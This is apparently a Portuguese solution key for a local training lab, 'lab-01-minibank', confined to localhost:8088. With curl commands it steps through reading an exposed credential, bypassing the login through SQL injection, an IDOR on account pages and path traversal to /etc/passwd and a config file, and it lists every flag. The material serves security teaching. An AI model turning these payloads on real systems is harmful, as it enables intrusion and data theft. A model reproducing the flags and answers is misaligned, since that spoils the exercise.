# Solution - lab-01-minibank

Gabarito tecnico objetivo do lab **lab-01-minibank**.

Escopo autorizado:

```text
http://localhost:8088
```

## 1. Enumeracao

Validar home:

```bash
curl -i http://localhost:8088
```

Procurar comentario HTML:

```bash
curl -s http://localhost:8088 | grep -i "<!--"
```

Comentario esperado:

```html
<!-- revisar robots.txt antes de publicar o portal legado -->
```

Ler `robots.txt`:

```bash
curl -i http://localhost:8088/robots.txt
```

Rotas descobertas:

- `/admin`
- `/backup`
- `/dev.txt`
- `/download`
- `/status`

Status verboso:

```bash
curl -i http://localhost:8088/status
```

## 2. Credencial exposta

Rota:

```text
GET /dev.txt
```

Acao:

```bash
curl -i http://localhost:8088/dev.txt
```

Credencial:

```text
backup_user:backup123
```

Flag:

```text
FLAG{credencial_exposta_capturada}
```

Validar uso da credencial:

```bash
curl -i -u backup_user:backup123 http://localhost:8088/backup
```

## 3. SQL Injection no login

Rota:

```text
POST /login
```

Enumeracao de usuarios por mensagens de erro:

```bash
curl -i -X POST http://localhost:8088/login \
  -d "username=naoexiste" \
  -d "password=teste"
```

Resultado esperado:

```text
Usuario nao encontrado.
```

```bash
curl -i -X POST http://localhost:8088/login \
  -d "username=joao" \
  -d "password=errada"
```

Resultado esperado:

```text
Senha invalida.
```

Essa enumeracao e intencional no lab e nao possui flag propria.

Payload funcional:

```text
username: admin' OR '1'='1' -- 
password: qualquercoisa
```

O espaco apos `--` faz parte do payload para comentario MySQL.

Com `curl`:

```bash
curl -i -c admin.cookies \
  --data-urlencode "username=admin' OR '1'='1' -- " \
  --data-urlencode "password=qualquercoisa" \
  http://localhost:8088/login
```

Capturar flag:

```bash
curl -s -b admin.cookies http://localhost:8088/dashboard | grep -i "FLAG"
```

Flag:

```text
FLAG{sqli_capturada}
```

## 4. IDOR em contas

Login como Joao:

```bash
curl -i -c joao.cookies \
  -d "username=joao&password=joao123" \
  http://localhost:8088/login
```

Conta de outro usuario:

```bash
curl -s -b joao.cookies http://localhost:8088/account/2
```

Flag:

```text
FLAG{idor_capturada}
```

## 5. Path Traversal / LFI controlado

Arquivo normal:

```bash
curl -i "http://localhost:8088/download?file=public-info.txt"
```

Ler o relatorio que contem a pista:

```bash
curl -i "http://localhost:8088/download?file=report-q2.txt"
```

Pista relevante:

```text
Durante a migracao, a configuracao antiga foi movida para o diretorio config.
Arquivo revisado pela equipe: legacy.conf
```

Prova de leitura fora do diretorio permitido:

```bash
curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
```

O endpoint `/status` vaza:

```text
internal_path=/usr/src/app
```

Como o downloader parte de `/usr/src/app/files`, a pista `config` + `legacy.conf` leva ao arquivo legado com a flag:

```bash
curl -i "http://localhost:8088/download?file=../config/legacy.conf"
```

Flag:

```text
FLAG{path_traversal_capturada}
```

## 6. Flags finais

- `FLAG{sqli_capturada}`
- `FLAG{idor_capturada}`
- `FLAG{credencial_exposta_capturada}`
- `FLAG{path_traversal_capturada}`

Validar com o comando documentado em `../VALIDATION.md`.
